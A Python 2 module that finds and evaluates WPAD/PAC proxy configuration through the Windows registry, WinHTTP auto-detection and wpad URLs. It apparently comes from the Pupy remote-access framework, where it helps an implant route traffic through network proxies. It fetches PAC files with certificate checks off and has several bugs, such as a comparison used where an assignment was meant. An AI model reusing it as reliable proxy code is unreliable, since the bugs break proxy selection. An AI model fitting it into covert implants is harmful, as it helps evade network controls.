# -*- encoding: utf-8 -*-

__all__ = (
    'get_proxy_for_address', 'set_proxy_unavailable',
    'refresh_pac_player'
)

from sys import getfilesystemencoding
from dukpy import JSInterpreter, JSRuntimeError
from urlparse import urlparse
from urllib2 import URLError
from socket import gethostbyname, gaierror, getfqdn
from netaddr import IPAddress, IPNetwork, AddrFormatError
from inspect import getmembers, ismethod
from os import name as os_name
from time import time
from re import match
from threading import Lock


try:
    from pupyimporter import dprint
except ImportError:
    def dprint(x):
        pass

if os_name == 'nt':
    from ctypes import WinDLL, byref, POINTER, c_void_p, cast
    from ctypes.wintypes import LPWSTR, BOOL, DWORD

    try:
        winhttp = WinDLL('winhttp.dll', use_last_error=True)
        kernel32 = WinDLL('kernel32.dll', use_last_error=True)

        WinHttpDetectAutoProxyConfigUrl = winhttp.WinHttpDetectAutoProxyConfigUrl
        WinHttpDetectAutoProxyConfigUrl.restype = BOOL
        WinHttpDetectAutoProxyConfigUrl.argtypes = (
            DWORD, POINTER(c_void_p)
        )

        GlobalFree = kernel32.GlobalFree
        GlobalFree.argtypes = (c_void_p,)
    except:
        WinHttpDetectAutoProxyConfigUrl = None


from . import Proxy
from . import getLogger


def _init_process_omit(self):
    pass


# We don't need to have environment in JSInterpreter
JSInterpreter._init_process = _init_process_omit


logger = getLogger('pac')

PAC_PLAYER = None
PAC_PLAYER_LAST_UPDATED = None

# It turns out that dukpy is not thread-safe
# https://github.com/amol-/dukpy/issues/18

PAC_PLAYER_LOCK = Lock()

WPAD_REFRESH_TIMEOUT = 3600


def get_autoconfig_url_nt():
    try:
        from _winreg import OpenKey, QueryValueEx, HKEY_CURRENT_USER
    except ImportError:
        return

    try:
        with OpenKey(
            HKEY_CURRENT_USER,
            'Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings') as key:
            value, _ = QueryValueEx(key, 'AutoConfigURL')
            return value
    except WindowsError:
        return None


def detect_autoconfig_url_nt():
    if not WinHttpDetectAutoProxyConfigUrl:
        return None

    url = c_void_p()
    if WinHttpDetectAutoProxyConfigUrl(3, byref(url)):
        if url.value:
            result = cast(url, LPWSTR).value.encode('idna')
            GlobalFree(url.value)
            return result


def propose_pac_domains():
    local_domain = getfqdn()
    if not local_domain:
        return

    if local_domain == 'localhost' or '.' not in local_domain:
        return

    parts = local_domain.split('.')
    for i in xrange(len(parts)-1):
        yield '.'.join(parts[i:])


def propose_pac_location():
    # TODO: Parse from google chrome/firefox settings
    if os_name == 'nt':
        for func in (get_autoconfig_url_nt, detect_autoconfig_url_nt):
            try:
                res = func()
                if res:
                    yield res

            except Exception as e:
                logger.exception(e)

    yield 'http://wpad/wpad.dat'

    for domain in propose_pac_domains():
        yield 'http://wpad.{}/wpad.dat'.format(domain)


def get_pac_content():
    from .tinyhttp import HTTP

    for url in propose_pac_location():
        try:
            parsed = urlparse(url)
            if parsed.scheme == 'file':
                return open(url.path).read(), url.path

            http = HTTP(proxy=False, follow_redirects=True, noverify=True)
            content, code = http.get(url, code=True)
            if code != 200:
                logger.debug('WPAD: %s: invalid HTTP status %d', url, code)
                continue

            if 'FindProxyForURL' not in content:
                logger.debug('WPAD: %s: invalid content')
                continue

            return content, url

        except URLError:
            # Connection failed
            pass

        except Exception as e:
            logger.exception('url: %s: %s', url, e)


def _refresh_pac_player():
    global PAC_PLAYER_LAST_UPDATED

    # Update anyway
    PAC_PLAYER_LAST_UPDATED = time()

    content = get_pac_content()
    if not content:
        return False

    script, source = get_pac_content()

    try:
        return PACPlayer(script, source)
    except JSRuntimeError as e:
        logger.exception('JS: %s', e)
    except UnicodeError as e:
        logger.exception(
            'JS/Unicode: script=%s (%s) source=%s (%s): %s',
            repr(script), type(script),
            repr(source), type(source),
            e
        )

    return False


def refresh_pac_player():
    with PAC_PLAYER_LOCK:
        return _refresh_pac_player()


def _get_proxy_for_address(address):
    global PAC_PLAYER

    if PAC_PLAYER is None or (
            time() - PAC_PLAYER_LAST_UPDATED > WPAD_REFRESH_TIMEOUT):

        PAC_PLAYER = _refresh_pac_player()

    if not PAC_PLAYER:
        return []

    return list(PAC_PLAYER[address])


def get_proxy_for_address(address):
    with PAC_PLAYER_LOCK:
        return _get_proxy_for_address(address)


def _set_proxy_unavailable(proto, addr):
    global PAC_PLAYER

    if not PAC_PLAYER:
        return

    PAC_PLAYER.unavailable.add(
        frozenset((proto, addr)))


def set_proxy_unavailable(proto, addr):
    with PAC_PLAYER_LOCK:
        _set_proxy_unavailable(proto, addr)


class PACPlayer(object):
    __slots__ = (
        'internal_ip', 'js', 'unavailable', 'source',
        '_lock'
    )

    def __init__(self, script, source):
        from .online import internal_ip

        if isinstance(script, bytes):
            try:
                script = script.decode(
                    getfilesystemencoding()
                )
            except UnicodeError:
                script = script.decode('ascii', 'ignore')

        if isinstance(source, bytes):
            try:
                source = source.decode(
                    getfilesystemencoding()
                )
            except UnicodeError:
                source = source.decode('ascii', 'ignore')

        self._lock = Lock()
        self.js = JSInterpreter()
        self.unavailable = set()
        self.source = source
        self.internal_ip = internal_ip()
        self._export_functions()
        self.js.evaljs(script)

    def __getitem__(self, address):
        url = None
        host = None

        if '://' in address:
            url = address
            host = urlparse(address).hostname
        else:
            host = address
            url = 'tcp://' + address + '/'

        try:
            with self._lock:
                proxies = self.js.evaljs(
                    'FindProxyForURL(dukpy["url"], dukpy["host"])',
                    url=url, host=host
                )
        except JSRuntimeError as e:
            logger.error('JS: %s', e)
            return

        if not proxies:
            return

        for proxy in (x.strip() for x in proxies.split(';')):
            if not proxy:
                continue

            elif proxy == 'DIRECT':
                yield Proxy('DIRECT', None, None, None)
                continue

            try:
                proto, addr = proxy.split()
            except ValueError:
                logger.info('Invalid proxy spec: %s', proxy)
                continue

            if proto == 'PROXY':
                proto = 'HTTP'
            elif proto == 'SOCKS':
                proto == 'SOCKS5'

            if frozenset((proto, addr)) not in self.unavailable:
                yield Proxy(proto, addr, None, None)

    def _export_functions(self):
        for method, impl in getmembers(self):
            if method.startswith('_') or not ismethod(impl):
                continue

            self.js.export_function(method, impl)
            self.js.evaljs(''';
                 {method} = function() {{
                 var args = Array.prototype.slice.call(arguments);
                 args.unshift('{method}');
                 return call_python.apply(null, args);
                 }};'''.format(method=method))

    def getHost(self, uri):
        if not uri:
            return None
        elif '://' in uri:
            return urlparse(uri).hostname
        elif '/' in uri:
            return uri.split('/', 1)[0].split(':')[0]
        else:
            return uri.split(':')[0]

    def dnsDomainIs(self, host, value):
        return self.getHost(host) == value

    def shExpMatch(self, host, wildcard):
        regexp = wildcard.replace('.','\\.').replace('*', '.*')
        try:
            return bool(match(regexp, host))
        except Exception, e:
            print e

        return False

    def dnsResolve(self, host):
        if not host:
            return None

        host = self.getHost(host)

        try:
            return str(IPAddress(host))
        except AddrFormatError:
            pass

        try:
            return gethostbyname(host)
        except gaierror:
            return None

    def isInNet(self, host, network, mask):
        host = self.getHost(host)
        ip = self.dnsResolve(host)
        if not ip:
            return False

        return ip in IPNetwork(
            '{}/{}'.format(network, mask))

    def myIpAddress(self):
        if self.internal_ip:
            return str(self.internal_ip)

    def isResolvable(self, host):
        try:
            gethostbyname(host)
        except gaierror:
            return False

        return True

    def dnsDomainLevels(self, host):
        return host.count('.')

    def isPlainHostName(self, host):
        return '.' not in self.getHost(host)

    def localHostOrDomainIs(self, host, value):
        return value.lower().startswith(host.lower())

    def alert(self, *args):
        dprint(' '.join(str(x) if type(x) is not unicode else x for x in args))
